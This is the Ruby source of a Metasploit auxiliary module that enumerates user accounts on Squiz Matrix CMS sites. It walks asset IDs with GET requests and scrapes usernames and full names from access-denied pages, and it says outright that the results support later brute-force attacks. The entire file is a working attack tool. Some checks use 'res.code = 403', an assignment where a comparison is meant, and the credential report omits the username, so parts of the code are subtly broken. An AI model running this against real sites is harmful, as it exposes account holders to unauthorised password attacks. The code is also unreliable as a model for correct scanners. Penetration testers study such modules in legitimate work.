##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient

  # Reporting facilities
  include Msf::Auxiliary::Report

  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Squiz Matrix User Enumeration Scanner',
      'Description'    => %q{
        This module attempts to enumerate remote users that exist within
        the Squiz Matrix and MySource Matrix CMS by sending GET requests for asset IDs
        e.g. ?a=14 and searching for a valid username eg "~root" or "~test" which
        is prefixed by a "~" in the response. It will also try to GET the users
        full name or description, or other information. You may wish to modify
        ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE.
        Information gathered may be used for later bruteforce attacks.
      },
      'Author'         => [ 'Troy Rose <troy[at]osisecurity.com.au>', 'aushack' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.osisecurity.com.au/advisories/' ],
        ],
      'DisclosureDate' => 'Nov 8 2011'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to users Squiz Matrix installation', '/']),
        OptInt.new('ASSETBEGIN',  [ true, "Asset ID to start at", 1]),
        OptInt.new('ASSETEND',  [ true, "Asset ID to stop at", 100]),
      ])
  end

  def run_host(ip)
    @users_found = {}

    asset_begin = datastore['ASSETBEGIN']
    asset_end = datastore['ASSETEND']
    if (asset_begin > asset_end)
      print_error("Unable to continue. ASSETEND must be greater than ASSETBEGIN")
    end

    asset_begin.upto(asset_end) do |asset|
      do_enum(asset)
    end

    if(@users_found.empty?)
      print_status("#{full_uri} - No users found.")
    else
      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(", ")}")
      report_note(
      :host => rhost,
      :port => rport,
      :proto => 'tcp',
      :sname => (ssl ? 'https' : 'http'),
      :type => 'users',
      :vhost => vhost,
      :data => {:users =>  @users_found.keys.join(", ")}
    )
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_enum(asset)
    begin
      uri = normalize_uri(target_uri.path)

      res = send_request_cgi({
        'uri'     =>  "#{uri}?a=#{asset}",
        'method'  => 'GET'
      }, 20)

      if (datastore['VERBOSE'])
        if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\w+)<\/i>/)
          print_status("#{full_uri}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
        else
          print_status("#{full_uri}?a=#{asset} - Trying Asset: '#{asset}'")
        end
      end

      if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>~(\w+)<\/i>/)
        user=$1.strip

        # try the full name of the user
        tmpasset = asset - 1
        res = send_request_cgi({
          'uri'     =>  "#{uri}?a=#{tmpasset}",
          'method'  => 'GET'
        }, 20)
        if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\/i>/)
          tmpasset = asset - 2
          res = send_request_cgi({
            'uri'     =>  "#{uri}?a=#{tmpasset}",
            'method'  => 'GET'
          }, 20)
          print_good("#{full_uri}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
          if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\/i>/)
            fullname = $1.strip
            print_good("#{full_uri}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})")
            @users_found["#{user} (#{fullname})"] = :reported
          end
        else
          print_good("#{full_uri} - Squiz Matrix User: '#{user}'")
          @users_found[user] = :reported
        end

        report_cred(
          ip: rhost,
          port: rport,
          service_name: (ssl ? 'https' : 'http'),
          proof: "WEBAPP=\"Squiz Matrix\", VHOST=#{vhost}"
        )
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end

  end
end
